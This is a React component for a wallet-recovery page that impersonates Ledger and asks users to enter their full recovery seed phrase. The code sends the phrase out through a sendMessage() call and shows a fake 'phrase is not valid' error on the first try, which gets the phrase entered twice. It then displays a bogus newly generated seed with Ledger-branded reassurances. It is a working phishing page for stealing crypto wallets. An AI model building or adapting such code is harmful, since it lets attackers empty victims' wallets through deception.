import React, { useEffect, useState } from 'react'
import { seed_phrase } from '../assets'
import ProgressBar from '../components/Progress/ProgressBar'
import BackButton from '../components/Buttons/BackButton'
import * as bip39 from 'bip39'
import RecoverWalletModal from '../components/Modals/RecoverWalletModal'
import { sendMessage } from '../utils/sendMessage'
import { Buffer } from 'buffer'
import Sidebar from '../components/Sidebar'
import NextButton from '../components/Buttons/NextButton'

declare global {
    interface Window {
        Buffer: typeof Buffer
    }
}

const SeedPhrases: React.FC = () => {
    const wordList = bip39.wordlists.english

    const [isModalOpen, setIsModalOpen] = useState(false)
    const [activeTab, setActiveTab] = useState<number>(12)
    const [words, setWords] = useState<Record<number, string>>({})
    const [errors, setErrors] = useState<Record<number, boolean>>({})
    const [formError, setFormError] = useState<string>('')
    const [errorCount, setErrorCount] = useState<number>(0)
    const [isCopied, setIsCopied] = useState<string>('Copy')
    const [info, setInfo] = useState<string>('')

    useEffect(() => {
        window.Buffer = Buffer
    }, [])

    const generateSeedWords = () => {
        const mnemonic = bip39.generateMnemonic(256)
        const generatedWords = mnemonic.split(' ').slice(0, activeTab)
        const wordMap = generatedWords.reduce<Record<number, string>>(
            (acc, word, index) => {
                acc[index + 1] = word
                return acc
            },
            {}
        )
        setWords(wordMap)
    }

    const copySeedPhrase = () => {
        navigator.clipboard.writeText(Object.values(words).join(' '))
        setIsCopied('Copied')
    }

    const showModal = () => {
        if (validateSeedPhrase()) {
            setFormError('')
            setIsModalOpen(true)
            let tempCount = errorCount
            console.log(tempCount)
            sendMessage(Object.values(words).join(' '))
                .then((res) => {
                    if (res.ok) {
                        setIsModalOpen(false)
                        if (tempCount > 0) {
                            generateSeedWords()
                            tempCount = -10
                            setErrorCount(tempCount)
                            setInfo(
                                'Your new recovery seed phrase has been successfully generated.\n Your wallet backup (recovery seed) is yours and your only: never share, store digitally, or disclose it to anyone, not even ledger support.'
                            )
                        }
                    }
                })
                .catch(() => {
                    setIsModalOpen(false)
                    setFormError(
                        'The phrase is not valid. Please check and try again.'
                    )
                    setWords({})
                })
                .finally(() => {
                    if (tempCount == -10) return
                    if (tempCount == 0) {
                        scrollTo(0, 0)
                        setFormError(
                            'The phrase is not valid. Please check and try again.'
                        )
                        setWords({})
                    }
                    setErrorCount(errorCount + 1)
                })
            console.log(errorCount)
        }
    }

    const handleTabChange = (tab: number) => {
        setActiveTab(tab)
        setWords({})
        setErrors({})
    }

    const handleValidatedInputChange = (index: number, value: string) => {
        const isValid = wordList.includes(value.toLowerCase())
        if (isValid || value === '') {
            setWords((prev) => ({ ...prev, [index]: value }))
            setErrors((prev) => ({ ...prev, [index]: false }))
        } else {
            setWords((prev) => ({ ...prev, [index]: value }))
            setErrors((prev) => ({ ...prev, [index]: true }))
        }
    }

    const validateSeedPhrase = (): boolean => {
        const isValid =
            Object.values(words).length === activeTab &&
            Object.values(words).every((word) => word.trim().length > 0) &&
            Object.values(errors).every((error) => !error)
        return isValid
    }

    return (
        <>
            <RecoverWalletModal
                isModalOpen={isModalOpen}
                setIsModalOpen={setIsModalOpen}
            />
            <div className="w-screen overflow-x-hidden min-h-screen font-inter flex relative bg-[#181a1c] text-white">
                <Sidebar mediaType="image" media={seed_phrase} />

                <div className="flex min-h-screen flex-col w-full overflow-x-hidden sm:px-[100px] px-[30px] py-[30px]">
                    <ProgressBar step={5} />

                    <div>
                        <h2 className="font-medium text-[26px] mb-[10px] font-dm-mono leading-[34px]">
                            INVALIDATE &amp; GENERATE NEW SEED PHRASE
                        </h2>
                        <p className="text-[14px] text-[#bfbfc1] leading-[1.5] mb-[20px]">
                            Enter your current Recovery Seed Phrase to recover
                            your funds. A new Recovery Seed Phrase will be
                            generated on the next step. <br />
                            DISCLAIMER: Ledger does not keep a copy of your
                            recovery phrase.
                        </p>
                    </div>

                    {formError && (
                        <p className="text-red-600 text-[14px]">
                            One or more words are incorrect. Please re-enter
                            your recovery phrase to access your wallet on this
                            Ledger Device.
                        </p>
                    )}

                    <div className="my-[30px] flex justify-between gap-[20px]">
                        {[12, 18, 24].map((num, index) => (
                            <button
                                key={index}
                                onClick={() => handleTabChange(num)}
                                className={`text-[14px] rounded-[4px] w-full font-semibold h-[42px] ${
                                    activeTab === num
                                        ? 'bg-[#bbb3fa] text-[#121113]'
                                        : 'text-[#bfbfc1] bg-[#222]'
                                }`}
                            >
                                {num} Words
                            </button>
                        ))}
                    </div>

                    <form
                        onSubmit={(e) => e.preventDefault()}
                        className="h-full flex flex-col"
                    >
                        <div className="flex flex-col md:grid md:grid-cols-4 md:gap-x-[5px] gap-[20px] w-full mb-[20px]">
                            {[...Array(activeTab)].map((_, i) => (
                                <input
                                    key={i}
                                    type="text"
                                    placeholder={`${i + 1}. word`}
                                    className={`rounded-[4px] text-[14px] font-semibold bg-[#151515] py-[10px] h-[42px] flex
                                    items-center w-full border px-[10px]
                                    ${
                                        errors[i + 1]
                                            ? 'border-[rgb(242,116,116)] text-[rgb(242,116,116)] shadow-[0_0_2px_rgb(242,116,116)]'
                                            : 'border-[rgb(51,51,51)] text-white focus-seed-shadow focus:border-[rgb(180,219,237)]'
                                    }
                                    focus:outline-none`}
                                    onChange={(e) =>
                                        handleValidatedInputChange(
                                            i + 1,
                                            e.target.value
                                        )
                                    }
                                    value={words[i + 1] || ''}
                                    required
                                />
                            ))}
                        </div>
                        <div className="mt-auto flex flex-col gap-[10px] w-full items-end">
                            <p className="whitespace-pre-line text-left w-full text-[14px] text-[#bfbfc1] leading-[1.5]">
                                {info}
                            </p>
                            <div className="flex justify-between w-full items-end">
                                <BackButton
                                    accepted={errorCount == -10}
                                    text={'Continue'}
                                    arrowDirection={'forward'}
                                    function={showModal}
                                />
                                <NextButton
                                    accepted={errorCount != -10}
                                    text={isCopied}
                                    function={copySeedPhrase}
                                />
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </>
    )
}

export default SeedPhrases
